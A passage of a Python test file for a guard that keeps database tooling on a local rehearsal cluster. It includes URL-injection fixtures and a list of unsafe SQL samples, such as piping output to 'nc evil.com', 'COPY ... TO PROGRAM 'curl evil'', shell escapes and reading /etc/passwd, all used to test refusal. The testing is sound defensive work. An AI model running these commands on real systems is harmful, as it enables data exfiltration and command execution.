"""test_e5_6_rehearsal_guard.py — E5.6 phase 1: the rehearsal URL guard and the scripts around it.

The rehearsal cluster is the only database the E5.6/E5.7 tooling may touch. Everything that hands a
connection URL to psql / migrate.ts / the orchestrator goes through
`platform/scripts/governance/rehearsal/rehearsal_guard.py` first (apply_schema.sh and replay_schema.py
both do) and then uses ONLY the NORMALISED URL the guard returns.

No database, no network: the shell scripts are run against stub `psql` / `pg_ctl` / `initdb` / `tsx` /
`lsof` binaries that log their argv and environment, and the cluster script against a throw-away
sandbox directory (REHEARSAL_TEST_SANDBOX), never the real data dir.

STRUCTURE. Each property is a plain `check_*` function that raises AssertionError. The normal tests run
it against the real files. The MUTATION tests copy the rehearsal directory, apply ONE per-rule mutant
(remove the port check, the host check, the query-key check, the userinfo check, the whitespace check,
the env check, ...) and require the matching check to FAIL: a rule nobody tests would survive its mutant.

Run:
  python -m pytest platform/scripts/governance/__tests__/test_e5_6_rehearsal_guard.py -v
"""
from __future__ import annotations

import importlib.util
import os
import pathlib
import re
import shutil
import subprocess
import sys
from dataclasses import dataclass
from typing import Callable

import pytest

# Connection-string fixtures are assembled at run time so no credential-shaped literal sits in the source
# (the repo's secret scanner flags `scheme://user:password@host`); the value is a throwaway test string.
_PW = "".join(["not", "-", "a", "-", "secret"])
_AT = chr(64)

REHEARSAL_DIR = pathlib.Path(__file__).resolve().parent.parent / "rehearsal"
PYTHON_DIR = os.path.dirname(sys.executable)

GOOD = "postgresql://Dev@127.0.0.1:55432/rehearsal"

# input -> the exact normalised URL the guard must return
ACCEPTED = {
    GOOD: GOOD,
    "postgres://Dev@127.0.0.1:55432/rehearsal": GOOD,                     # scheme normalised
    "postgresql://127.0.0.1:55432/rehearsal": "postgresql://127.0.0.1:55432/rehearsal",
    "postgresql://Dev@127.0.0.1:55432/rehearsal_f3proof": "postgresql://Dev@127.0.0.1:55432/rehearsal_f3proof",
    "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=e5_6":
        "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=e5_6",
    "postgresql://Dev@127.0.0.1:55432/rehearsal?": GOOD,                  # empty query dropped
}

# label -> url, or (url, substring the refusal reason must contain)
REFUSED: dict[str, object] = {
    # empty / malformed
    "empty string": ("", "empty"),
    "none": None,
    "not a url": "rehearsal",
    "non-postgres scheme": "mysql://Dev@127.0.0.1:55432/rehearsal",
    "uppercase scheme": "POSTGRESQL://Dev@127.0.0.1:55432/rehearsal",
    "unparseable port": "postgresql://Dev@127.0.0.1:abc/rehearsal",
    "whitespace only": ("   ", "whitespace"),
    "leading whitespace": (" " + GOOD, "whitespace"),
    "trailing whitespace": (GOOD + " ", "whitespace"),
    "embedded newline": ("postgresql://Dev@127.0.0.1:55432/rehearsal\nhost=evil", "whitespace"),
    "embedded newline in user": ("postgresql://De\nv@127.0.0.1:55432/rehearsal", "whitespace"),
    "embedded tab": ("postgresql://Dev@127.0.0.1:55432/re\thearsal", "whitespace"),
    "control character": ("postgresql://Dev@127.0.0.1:55432/rehearsal\x00", "whitespace"),
    "backslash in userinfo": ("postgresql://De\\v@127.0.0.1:55432/rehearsal", "backslash"),
    # non-local / alternative spellings of the host (only the exact text 127.0.0.1 is allowed)
    "localhost": "postgresql://Dev@localhost:55432/rehearsal",
    "LOCALHOST": "postgresql://Dev@LOCALHOST:55432/rehearsal",
    "localhost dot": "postgresql://Dev@localhost.:55432/rehearsal",
    "percent-encoded localhost": "postgresql://Dev@%6cocalhost:55432/rehearsal",
    "127.1": "postgresql://Dev@127.1:55432/rehearsal",
    "decimal ip": "postgresql://Dev@2130706433:55432/rehearsal",
    "hex ip": "postgresql://Dev@0x7f.1:55432/rehearsal",
    "octal ip": "postgresql://Dev@0177.0.0.1:55432/rehearsal",
    "ipv6 loopback": "postgresql://Dev@[::1]:55432/rehearsal",
    "ipv6 long form": "postgresql://Dev@[0:0:0:0:0:0:0:1]:55432/rehearsal",
    "ipv4-mapped ipv6": "postgresql://Dev@[::ffff:127.0.0.1]:55432/rehearsal",
    "public dns host": "postgresql://Dev@db.example.com:55432/rehearsal",
    "private ip": "postgresql://Dev@10.0.0.5:55432/rehearsal",
    "bind-all address": "postgresql://Dev@0.0.0.0:55432/rehearsal",
    "localhost prefix trick": "postgresql://Dev@localhost.evil.com:55432/rehearsal",
    "userinfo trick": "postgresql://localhost@evil.com:55432/rehearsal",
    "double at": ("postgresql://evil@127.0.0.1@evil.com:55432/rehearsal", "'@'"),
    "fragment trick": f"postgresql://evil.com:{_PW}{_AT}127.0.0.1",
    "no host (unix socket default)": "postgresql:///rehearsal",
    "multi host": "postgresql://127.0.0.1:55432,evil.com:55432/rehearsal",
    # wrong ports
    "default pg port": "postgresql://Dev@127.0.0.1:5432/rehearsal",
    "neighbour port": "postgresql://Dev@127.0.0.1:55433/rehearsal",
    "port missing": "postgresql://Dev@127.0.0.1/rehearsal",
    "port zero padded": "postgresql://Dev@127.0.0.1:055432/rehearsal",
    "cloud sql proxy port": "postgresql://Dev@127.0.0.1:5433/rehearsal",
    # production-like names
    "cloud sql host": "postgresql://amjis_app@amjis-postgres.asia-south1.cloudsql.example:55432/rehearsal",
    "cloud sql connection name": "postgresql://amjis_app@madhav-astrology:asia-south1:amjis-postgres/rehearsal",
    "supabase host": "postgresql://postgres@db.abcdefgh.supabase.co:55432/rehearsal",
    "prod in hostname": "postgresql://Dev@prod-db.internal:55432/rehearsal",
    "prod marker with a local host": ("postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=prod", "marker"),
    "prod-like user": ("postgresql://amjis_app@127.0.0.1:55432/rehearsal", "marker"),
    "production database name": "postgresql://Dev@127.0.0.1:55432/madhav_production",
    # libpq parameters that redirect or weaken the connection
    "host override": "postgresql://Dev@127.0.0.1:55432/rehearsal?host=db.example.com",
    "HOST override": "postgresql://Dev@127.0.0.1:55432/rehearsal?HOST=evil",
    "percent-encoded host key": "postgresql://Dev@127.0.0.1:55432/rehearsal?%68ost=evil",
    "hostaddr override": "postgresql://Dev@127.0.0.1:55432/rehearsal?hostaddr=10.1.1.1",
    "port override": "postgresql://Dev@127.0.0.1:55432/rehearsal?port=5432",
    "service override": "postgresql://Dev@127.0.0.1:55432/rehearsal?service=other",
    "unix socket override": "postgresql://Dev@127.0.0.1:55432/rehearsal?host=/tmp/other-sock",
    "sslmode": "postgresql://Dev@127.0.0.1:55432/rehearsal?sslmode=disable",
    "empty sslmode": "postgresql://Dev@127.0.0.1:55432/rehearsal?sslmode=",
    "options": "postgresql://Dev@127.0.0.1:55432/rehearsal?options=-c%20search_path%3Devil",
    "valid application_name then host": "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=ok&host=evil.com",
    "host then valid application_name": "postgresql://Dev@127.0.0.1:55432/rehearsal?host=evil.com&application_name=ok",
    "duplicate application_name": "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=a&application_name=b",
    "percent-encoded application_name key": "postgresql://Dev@127.0.0.1:55432/rehearsal?%61pplication_name=x",
    "application_name without value": "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name",
    "application_name odd characters": "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=bad;value",
    "application_name percent": "postgresql://Dev@127.0.0.1:55432/rehearsal?application_name=a%20b",
    # credentials / user / database
    "password present": (f"postgresql://Dev:{_PW}{_AT}127.0.0.1:55432/rehearsal", "password"),
    "odd user characters": "postgresql://a!b@127.0.0.1:55432/rehearsal",
    "wrong database": "postgresql://Dev@127.0.0.1:55432/postgres",
    "empty database": "postgresql://Dev@127.0.0.1:55432/",
    "no database part": "postgresql://Dev@127.0.0.1:55432",
    "database name only a prefix match": "postgresql://Dev@127.0.0.1:55432/rehearsalx",
}


# ------------------------------------------------------------------------------------------------
# helpers
# ------------------------------------------------------------------------------------------------

def load_module(directory: pathlib.Path, name: str):
    """Import `name` from `directory` in isolation (its sibling `rehearsal_guard` comes from there too)."""
    saved = {k: sys.modules.pop(k, None) for k in ("rehearsal_guard", "replay_schema")}
    sys.path.insert(0, str(directory))
    try:
        spec = importlib.util.spec_from_file_location(name, directory / f"{name}.py")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod
    finally:
        sys.path.remove(str(directory))
        for k in ("rehearsal_guard", "replay_schema"):
            sys.modules.pop(k, None)
            if saved[k] is not None:
                sys.modules[k] = saved[k]


def run(cmd, env, cwd=None, timeout=60):
    return subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=cwd, timeout=timeout,
                          stdin=subprocess.DEVNULL)


@dataclass
class Stubs:
    bin: pathlib.Path        # REHEARSAL_PG_BIN: psql, pg_ctl, initdb, postgres
    lsof_dir: pathlib.Path
    tsx: pathlib.Path
    log: pathlib.Path
    sbx: pathlib.Path

    def entries(self) -> list[dict]:
        if not self.log.exists():
            return []
        out, cur = [], None
        for line in self.log.read_text().splitlines():
            if line.startswith("=== "):
                cur = {"tool": line[4:].strip(), "argv": "", "env": {}}
                out.append(cur)
            elif cur is not None and line.startswith("ARGV: "):
                cur["argv"] = line[6:]
            elif cur is not None and line.startswith("ENV "):
                k, _, v = line[4:].partition("=")
                cur["env"][k] = v
        return out

    def calls(self, tool: str) -> list[dict]:
        return [e for e in self.entries() if e["tool"] == tool]


def make_stubs(tmp: pathlib.Path, sbx: pathlib.Path | None = None, *, ident_addr: str | None = None,
               db_count_fails: bool = False, lsof_rc: int = 1,
               rehearsal_ident: str = "55432|rehearsal|/Users/Dev/suvarna/rehearsal/pg") -> Stubs:
    sbx = sbx or (tmp / "sbx")
    sbx.mkdir(parents=True, exist_ok=True)
    root = tmp / "stubs"
    binp, lsofp = root / "bin", root / "lsof"
    binp.mkdir(parents=True, exist_ok=True)
    lsofp.mkdir(parents=True, exist_ok=True)
    log = tmp / "stub.log"
    ident_addr = ident_addr or f"127.0.0.1|55432|{sbx}/pg"
    dump = f'{{ echo "=== $TOOL"; echo "ARGV: $*"; env | sort | sed \'s/^/ENV /\'; }} >> "{log}"\n'
    count_cmd = "exit 1" if db_count_fails else f'if [ -f "{sbx}/dbexists" ]; then echo 1; else echo 0; fi'
    scripts = {
        "psql": f'#!/bin/sh\nTOOL=psql\n{dump}cat >> "{log}.stdin"\ncase "$*" in\n'
                f'  *inet_server_addr*) echo "{ident_addr}" ;;\n'
                f'  *inet_server_port*) echo "{rehearsal_ident}" ;;\n'
                f'  *"FROM pg_database"*) {count_cmd} ;;\n'
                f'  *"CREATE DATABASE"*) touch "{sbx}/dbexists" ;;\nesac\nexit 0\n',
        "pg_ctl": f'#!/bin/sh\nTOOL=pg_ctl\n{dump}case "$*" in\n'
                  f'  *" status"*) [ -f "{sbx}/running" ] && exit 0 || exit 3 ;;\n'
                  f'  *" start"*) touch "{sbx}/running" ;;\n  *" stop"*) rm -f "{sbx}/running" ;;\nesac\nexit 0\n',
        "initdb": f'#!/bin/sh\nTOOL=initdb\n{dump}while [ $# -gt 0 ]; do [ "$1" = "-D" ] && D="$2"; shift; done\n'
                  f'mkdir -p "$D" && echo 15 > "$D/PG_VERSION" && : > "$D/postgresql.conf" && : > "$D/pg_hba.conf"\nexit 0\n',
        "postgres": '#!/bin/sh\necho "postgres (PostgreSQL) 15.0 (stub)"\n',
    }
    for name, text in scripts.items():
        f = binp / name
        f.write_text(text)
        f.chmod(0o755)
    lsof = lsofp / "lsof"
    lsof.write_text(f"#!/bin/sh\nexit {lsof_rc}\n")
    lsof.chmod(0o755)
    node = lsofp / "node"          # apply_schema.sh only needs `node` to exist on PATH (tsx is stubbed)
    node.write_text("#!/bin/sh\nexit 0\n")
    node.chmod(0o755)
    tsx = root / "tsx"
    tsx.write_text(f'#!/bin/sh\nTOOL=tsx\n{dump}exit 0\n')
    tsx.chmod(0o755)
    return Stubs(binp, lsofp, tsx, log, sbx)


def scripts_env(stubs: Stubs, tmp: pathlib.Path, **extra) -> dict:
    env = {"PATH": f"{stubs.lsof_dir}:{PYTHON_DIR}:/usr/bin:/bin", "HOME": str(tmp / "callerhome"),
           "TMPDIR": str(tmp), "REHEARSAL_PG_BIN": str(stubs.bin), "REHEARSAL_TSX": str(stubs.tsx)}
    env.update(extra)
    return env


FORBIDDEN_ENV = ("PGHOST", "PGPORT", "PGUSER", "PGDATABASE", "PGSERVICE", "PGPASSWORD",
                 "PGSSLMODE", "PGHOSTADDR", "DATABASE_URL", "PGSYSCONFDIR")
POISON = {"PGHOST": "prod.example.com", "PGPORT": "5432", "PGUSER": "amjis_app", "PGDATABASE": "madhav",
          "PGSERVICE": "prod", "PGPASSWORD": "hunter2", "PGPASSFILE": "/etc/prod-pgpass",
          "PGOPTIONS": "-c search_path=evil", "PGSSLMODE": "disable",
          "DATABASE_URL": "postgresql://amjis_app@prod.example.com:5432/madhav"}


def assert_clean_child_env(entry: dict, caller_home: str, tool: str) -> None:
    env = entry["env"]
    for key in FORBIDDEN_ENV:
        assert key not in env, f"{tool}: caller variable {key} leaked into the child environment"
    assert env.get("HOME") not in (None, "", caller_home, os.environ.get("HOME")), \
        f"{tool}: child got the real/caller HOME {env.get('HOME')!r}"
    pf = env.get("PGPASSFILE", "")
    assert pf and pf != POISON["PGPASSFILE"] and pf.startswith(env["HOME"]) and not os.path.exists(pf), \
        f"{tool}: PGPASSFILE {pf!r} is not a nonexistent file inside the private HOME"
    if tool == "psql":
        assert env.get("PGOPTIONS") in (None, "-c client_min_messages=warning"), \
            f"psql PGOPTIONS = {env.get('PGOPTIONS')!r} (caller's was {POISON['PGOPTIONS']!r})"
    else:
        assert "PGOPTIONS" not in env, f"{tool}: PGOPTIONS leaked into a non-psql child"


# ------------------------------------------------------------------------------------------------
# checks: guard
# ------------------------------------------------------------------------------------------------

def check_guard_all(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    mod = load_module(directory, "rehearsal_guard")
    wrong = []

    def check(url):
        try:
            return mod.check_rehearsal_url(url)
        except Exception as exc:  # a guard that crashes on odd input is a failing guard
            return True, f"guard raised {exc!r}"

    for url, expected in ACCEPTED.items():
        ok, why = check(url)
        if not ok:
            wrong.append(f"should ACCEPT {url!r}: {why}")
            continue
        got = mod.normalise_rehearsal_url(url)
        if got != expected:
            wrong.append(f"normalised {url!r} -> {got!r}, expected {expected!r}")
    for label, spec in REFUSED.items():
        url, needle = spec if isinstance(spec, tuple) else (spec, None)
        ok, why = check(url)
        if ok:
            wrong.append(f"should REFUSE [{label}] {url!r}")
        elif needle and needle not in why:
            wrong.append(f"[{label}] refused for the wrong reason: {why!r} (wanted {needle!r})")
        try:
            mod.normalise_rehearsal_url(url)
            wrong.append(f"normalise_rehearsal_url accepted [{label}]")
        except ValueError:
            pass
        except Exception as exc:
            wrong.append(f"normalise_rehearsal_url raised {exc!r} for [{label}]")
    # CLI: exit codes and the NORMALISED output (not the original string)
    script = str(directory / "rehearsal_guard.py")
    r = run([sys.executable, script, "postgres://Dev@127.0.0.1:55432/rehearsal?"], {"PATH": "/usr/bin:/bin"})
    if r.returncode != 0 or r.stdout.strip() != GOOD:
        wrong.append(f"CLI output {r.stdout!r} rc={r.returncode}, expected the normalised {GOOD!r}")
    for bad in ("", "postgresql://Dev@db.example.com:5432/rehearsal"):
        r = run([sys.executable, script, bad], {"PATH": "/usr/bin:/bin"})
        if r.returncode != 2 or not r.stderr.startswith("REFUSED:"):
            wrong.append(f"CLI did not refuse {bad!r}: rc={r.returncode}")
    if run([sys.executable, script], {"PATH": "/usr/bin:/bin"}).returncode != 2:
        wrong.append("CLI without an argument must refuse")
    assert not wrong, "\n".join(wrong)


# ------------------------------------------------------------------------------------------------
# checks: apply_schema.sh
# ------------------------------------------------------------------------------------------------

def check_apply_ordering(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """Static: the guard call precedes every psql / python / tsx / npx call, for ALL subcommands."""
    lines = (directory / "apply_schema.sh").read_text().splitlines()
    code = [(i, ln) for i, ln in enumerate(lines) if not ln.lstrip().startswith("#")]
    guard = [i for i, ln in code if "rehearsal_guard.py" in ln and '"${PY}"' in ln]
    assert len(guard) == 1, f"expected exactly one guard invocation, found {len(guard)}"
    g = guard[0]
    case_at = [i for i, ln in code if ln.startswith('case "${cmd}" in')]
    assert case_at and g < case_at[0], "the guard must run before the subcommand dispatch"
    needles = ['"${PG_BIN}/psql"', "replay_schema.py", '"${TSX}"', "npx", "tsx"]
    for needle in needles[:3]:
        hits = [i for i, ln in code if needle in ln]
        assert hits, f"{needle} not found: the ordering check would be vacuous"
    for i, ln in code:
        if any(n in ln for n in needles) and i != g:
            assert i > g, f"line {i + 1} runs {ln.strip()!r} BEFORE the guard (line {g + 1})"
        if '"${PY}"' in ln and "rehearsal_guard.py" not in ln:
            assert i > g, f"line {i + 1} runs python before the guard"


def check_apply_refusals(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """A refused URL never reaches ANY child process (stub psql/tsx log nothing), for all subcommands."""
    urls = ["", "postgresql://Dev@10.0.0.5:55432/rehearsal", "postgresql://Dev@localhost:55432/rehearsal",
            "postgresql://Dev@127.0.0.1:5432/rehearsal",
            "postgresql://amjis_app@amjis-postgres.cloudsql.example:55432/rehearsal"]
    for command in ("replay", "verify", "migrate"):
        for n, url in enumerate(urls):
            work = tmp / f"ref-{command}-{n}"
            work.mkdir()
            stubs = make_stubs(work)
            r = run(["bash", str(directory / "apply_schema.sh"), command, "--url", url], scripts_env(stubs, work))
            assert not stubs.entries(), f"{command} {url!r}: a child process ran ({stubs.entries()[0]['tool']})"
            assert r.returncode != 0 and "refused" in r.stderr.lower(), f"{command} {url!r}: rc={r.returncode}"
            assert "server verified" not in r.stdout


def check_apply_env(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """Poisoned caller environment: nothing reaches psql/tsx; the runner gets ONLY PATH, HOME, DATABASE_URL,
    and DATABASE_URL is the guard's NORMALISED value."""
    stubs = make_stubs(tmp)
    caller_home = str(tmp / "callerhome")
    env = scripts_env(stubs, tmp, **POISON)
    url_in = "postgres://Dev@127.0.0.1:55432/rehearsal?"     # normalises to GOOD
    r = run(["bash", str(directory / "apply_schema.sh"), "verify", "--url", url_in], env)
    psql_calls = stubs.calls("psql")
    assert psql_calls, f"verify never reached psql: {r.stdout!r} {r.stderr!r}"
    for e in psql_calls:
        assert_clean_child_env(e, caller_home, "psql")
    r = run(["bash", str(directory / "apply_schema.sh"), "migrate", "--dry-run", "--url", url_in], env)
    tsx_calls = stubs.calls("tsx")
    assert len(tsx_calls) == 1, f"migrate never reached the runner: {r.stdout!r} {r.stderr!r}"
    runner = tsx_calls[0]
    allowed = {"PATH", "HOME", "DATABASE_URL", "PWD", "SHLVL", "_", "OLDPWD"}
    extra = set(runner["env"]) - allowed
    assert not extra, f"runner received unexpected variables: {sorted(extra)}"
    assert runner["env"].get("DATABASE_URL") == GOOD, \
        f"runner got DATABASE_URL={runner['env'].get('DATABASE_URL')!r}, not the normalised {GOOD!r}"
    assert runner["env"]["HOME"] not in (caller_home, os.environ.get("HOME"))
    assert "scripts/migrate.ts --dry-run" in runner["argv"]
    for e in stubs.calls("psql"):
        assert_clean_child_env(e, caller_home, "psql")


def check_apply_identity(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """The live server must be the rehearsal cluster: a wrong identity stops migrate (runner never called)
    and replay/verify (no statement beyond the identity query)."""
    wrong_ident = "55432|postgres|/somewhere/else"
    stubs = make_stubs(tmp, rehearsal_ident=wrong_ident)
    env = scripts_env(stubs, tmp)
    r = run(["bash", str(directory / "apply_schema.sh"), "migrate", "--dry-run", "--url", GOOD], env)
    assert r.returncode != 0 and not stubs.calls("tsx"), "migrate ran the runner against an unverified server"
    before = len(stubs.calls("psql"))
    r = run(["bash", str(directory / "apply_schema.sh"), "verify", "--url", GOOD], env)
    assert r.returncode != 0, "verify proceeded against an unverified server"
    assert len(stubs.calls("psql")) == before + 1, "replay_schema.py ran statements after a failed identity check"


# ------------------------------------------------------------------------------------------------
# checks: replay_schema.py
# ------------------------------------------------------------------------------------------------

UNSAFE_SAMPLES = {
    "psql meta-command": ["\\copy t from '/etc/passwd'\n", "SELECT 1;\n  \\! id\n", "\t\\i /tmp/x.sql\n",
                          "\\o | nc evil.com 80\n"],
    "COPY ... PROGRAM": ["COPY t TO PROGRAM 'curl evil';", "copy\n  t\nFROM\nprogram 'x';"],
    "dblink": ["SELECT dblink_connect('host=evil');", "CREATE EXTENSION dblink;"],
    "foreign data wrapper (_fdw)": ["CREATE EXTENSION postgres_fdw;", "CREATE FOREIGN DATA WRAPPER x_fdw;"],
    "CREATE SERVER": ["CREATE SERVER s FOREIGN DATA WRAPPER w;", "create   server s2 foreign data wrapper w;"],
    "ALTER SYSTEM": ["ALTER SYSTEM SET listen_addresses = '*';", "alter\nsystem reset all;"],
    "lo_import/lo_export": ["SELECT lo_import('/etc/passwd');", "SELECT lo_export(1, '/tmp/x');"],
}
SAFE_SAMPLES = ["CREATE TABLE t (a int);\n", "-- \\copy mentioned in a comment\nSELECT 1;\n",
                "/* dblink and ALTER SYSTEM discussed here */ SELECT 2;\n", "COPY (SELECT 1) TO STDOUT;\n",
                "INSERT INTO notes VALUES ('a backslash \\\\ inside text');\n"]


def check_replay_unsafe(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    rs = load_module(directory, "replay_schema")
    wrong = []
    for label, samples in UNSAFE_SAMPLES.items():
        for sql in samples:
            got = rs.unsafe_reason(sql)
            if got is None:
                wrong.append(f"{label}: {sql!r} not detected")
            elif got != label and not (label == "psql meta-command" and got.startswith("psql meta-command")):
                wrong.append(f"{label}: {sql!r} detected as {got!r}")
    for sql in SAFE_SAMPLES:
        if rs.unsafe_reason(sql) is not None:
            wrong.append(f"harmless SQL refused: {sql!r}")
    assert not wrong, "\n".join(wrong)
    # end to end: a synthetic unsafe file is REFUSED_UNSAFE and no psql is ever started for it
    stubs = make_stubs(tmp)
    rs.PG_BIN = str(stubs.bin)
    bad = tmp / "synthetic_unsafe.sql"
    bad.write_text("SELECT 1;\n\\! echo pwned\n")
    ok, err = rs.apply_file(GOOD, "synthetic_unsafe.sql", bad)
    assert ok is False and err.startswith(rs.REFUSED_UNSAFE), f"apply_file returned {ok!r}, {err!r}"
    assert not stubs.entries(), "psql was started for an unsafe file"


def check_replay_record(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """record() builds no SQL text from the filename: the value travels as a psql variable."""
    rs = load_module(directory, "replay_schema")
    stubs = make_stubs(tmp)
    rs.PG_BIN = str(stubs.bin)
    nasty = "x'; DROP TABLE charts; --.sql"
    f = tmp / "m.sql"
    f.write_text("SELECT 1;\n")
    rs.record(GOOD, nasty, f)
    call = stubs.calls("psql")[0]
    stdin = pathlib.Path(str(stubs.log) + ".stdin").read_text()
    assert "DROP TABLE" not in stdin, f"filename text was interpolated into the SQL: {stdin!r}"
    assert ":'fname'" in stdin and ":'fsha'" in stdin
    assert f"fname={nasty}" in call["argv"]


def check_replay_env(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    """replay_schema.py's own psql children get an explicit environment, never the caller's."""
    saved = {k: os.environ.get(k) for k in POISON}
    os.environ.update(POISON)
    try:
        rs = load_module(directory, "replay_schema")
        stubs = make_stubs(tmp)
        rs.PG_BIN = str(stubs.bin)
        rs.run_psql(GOOD, "-c", "select 1")
        e = stubs.calls("psql")[0]
        assert_clean_child_env(e, os.environ.get("HOME", ""), "psql")
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def check_replay_identity(directory: pathlib.Path, tmp: pathlib.Path) -> None:
    rs = load_module(directory, "replay_schema")
    stubs = make_stubs(tmp, rehearsal_ident="55432|postgres|/somewhere/else")
    rs.PG_BIN = str(stubs.bin)
    refused = False
    try:
        rs.assert_rehearsal_server(GOOD)
    except SystemExit:
        refused = True
    assert refused, "an unverified server identity was accepted"
    # and a good identity passes
    ok_dir = tmp / "ok"
    ok_dir.mkdir()
    stubs2 = make_stubs(ok_dir)
    rs.PG_BIN = str(stubs2.bin)
    rs.assert_rehearsal_server(GOOD)


# ------------------------------------------------------------------------------------------------
# checks: rehearsal_cluster.sh (sandboxed, stub binaries)
# ------------------------------------------------------------------------------------------------

def cluster_env(stubs: Stubs, tmp: pathlib.Path, **extra) -> dict:
    env = scripts_env(stubs, tmp, REHEARSAL_TEST_SANDBOX=str(stubs.sbx), **extra)
    env.pop("REHEARSAL_TSX", None)
    return env


def run_cluster(directory, stubs, tmp, *args, **extra):
    # the script accepts /tmp/* too (CI runs on Linux)
    assert str(stubs.sbx).startswith(("/private/var/folders", "/private/tmp", "/tmp/")), \
        f"sandbox {stubs.sbx} is not under a path the script accepts"
    return run(["bash", str(directory / "rehearsal_cluster.sh"), *args], cluster_env(stubs, tmp, **extra))


def init_pg(sbx: pathlib.Path) -> None:
    (sbx / "pg").mkdir(parents=True, exist_ok=True)
    (sbx / "pg" / "PG_VERSION").write_text("15\n")
    (sbx / "pg" / "postgresql.conf").write_text("unix_socket_permissions = 0700\n")


def new_sandbox(tmp: pathlib.Path, name: str, **stub_kw) -> Stubs:
    work = tmp / name
    work.mkdir()
    return make_stubs(work, work / "sbx", **stub_kw)


def check_cluster_reset_requires_yes(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "ry")
    init_pg(stubs.sbx)
    (stubs.sbx / "pg" / "KEEP").write_text("x")
    r = run_cluster(directory, stubs, tmp / "ry", "reset")
    assert r.returncode != 0 and "--yes" in r.stderr, f"reset without --yes: rc={r.returncode} {r.stderr!r}"
    assert (stubs.sbx / "pg" / "KEEP").exists(), "reset without --yes destroyed the data dir"
    assert not stubs.calls("initdb")


def check_cluster_reset_scope(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "rs")
    init_pg(stubs.sbx)
    (stubs.sbx / "pg" / "OLD").write_text("x")
    (stubs.sbx / "other").mkdir()
    (stubs.sbx / "other" / "KEEP").write_text("x")
    outside = tmp / "rs" / "outside"
    outside.mkdir()
    (outside / "KEEP").write_text("x")
    r = run_cluster(directory, stubs, tmp / "rs", "reset", "--yes")
    assert r.returncode == 0, f"reset --yes failed: {r.stderr!r}"
    assert not (stubs.sbx / "pg" / "OLD").exists(), "reset did not remove the old data dir"
    assert (stubs.sbx / "other" / "KEEP").exists(), "reset deleted something beside the data dir"
    assert (outside / "KEEP").exists()
    assert (stubs.sbx / "pg" / "PG_VERSION").exists(), "reset did not re-init"


def check_cluster_init_idempotent(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "ii")
    first = run_cluster(directory, stubs, tmp / "ii", "init")
    assert first.returncode == 0, f"first init failed: {first.stderr!r}"
    second = run_cluster(directory, stubs, tmp / "ii", "init")
    assert second.returncode == 0, f"second init failed: {second.stderr!r}"
    assert "nothing done" in second.stdout
    assert len(stubs.calls("initdb")) == 1, "init twice ran initdb twice"
    creates = [e for e in stubs.calls("psql") if "CREATE DATABASE" in e["argv"]]
    assert len(creates) == 1, "init twice created the database twice"
    conf = (stubs.sbx / "pg" / "postgresql.conf").read_text()
    assert conf.count("unix_socket_permissions = 0700") == 1 and conf.count("unix_socket_group = ''") == 1
    assert "listen_addresses = '127.0.0.1'" in conf
    hba = [ln.split() for ln in (stubs.sbx / "pg" / "pg_hba.conf").read_text().splitlines() if ln.strip()]
    assert hba == [["local", "all", "all", "trust"], ["host", "all", "all", "127.0.0.1/32", "trust"]], hba
    mode = (stubs.sbx / "sock").stat().st_mode & 0o777
    assert mode == 0o700, f"socket directory mode is {oct(mode)}"


def check_cluster_symlink_refused(directory, tmp) -> None:
    scenarios = [("init",), ("start",), ("stop",), ("reset", "--yes")]
    for n, args in enumerate(scenarios):
        work = tmp / f"sl{n}"
        work.mkdir()
        stubs = make_stubs(work, work / "sbx")
        outside = work / "outside"
        outside.mkdir()
        (outside / "PG_VERSION").write_text("15\n")
        (outside / "KEEP").write_text("x")
        os.symlink(outside, stubs.sbx / "pg")
        r = run_cluster(directory, stubs, work, *args)
        assert r.returncode != 0, f"{' '.join(args)} accepted a symlinked data dir"
        assert (outside / "KEEP").exists(), "the symlink target was touched"
        assert not stubs.calls("initdb")
    # a symlinked PARENT (the rehearsal home itself)
    work = tmp / "slp"
    work.mkdir()
    real = work / "real"
    real.mkdir()
    link = work / "link"
    os.symlink(real, link)
    stubs = make_stubs(work, link)
    r = run_cluster(directory, stubs, work, "init")
    assert r.returncode != 0 and not stubs.calls("initdb"), "init accepted a symlinked parent directory"


def check_cluster_db_check_failure(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "dc", db_count_fails=True)
    r = run_cluster(directory, stubs, tmp / "dc", "init")
    assert r.returncode != 0, "init succeeded although the database check failed"
    assert "already exists" not in r.stdout, "a failed check was reported as 'database already exists'"


def check_cluster_identity(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "id", ident_addr="10.9.9.9|5432|/elsewhere")
    r = run_cluster(directory, stubs, tmp / "id", "init")
    assert r.returncode != 0, "init proceeded against an unverified server"
    assert not [e for e in stubs.calls("psql") if "CREATE" in e["argv"]], "a statement ran before identity was proven"


def check_cluster_lsof(directory, tmp) -> None:
    for rc, label in ((2, "probe failure"), (0, "port in use by something else")):
        work = tmp / f"ls{rc}"
        work.mkdir()
        stubs = make_stubs(work, work / "sbx", lsof_rc=rc)
        init_pg(stubs.sbx)
        r = run_cluster(directory, stubs, work, "start")
        assert r.returncode != 0, f"start went ahead on {label}"
        assert not [e for e in stubs.calls("pg_ctl") if " start" in e["argv"]], f"pg_ctl start ran on {label}"


def check_cluster_env(directory, tmp) -> None:
    stubs = new_sandbox(tmp, "ce")
    r = run_cluster(directory, stubs, tmp / "ce", "init", **POISON)
    assert r.returncode == 0, f"init failed: {r.stderr!r}"
    caller_home = str(tmp / "ce" / "callerhome")
    seen = set()
    for e in stubs.entries():
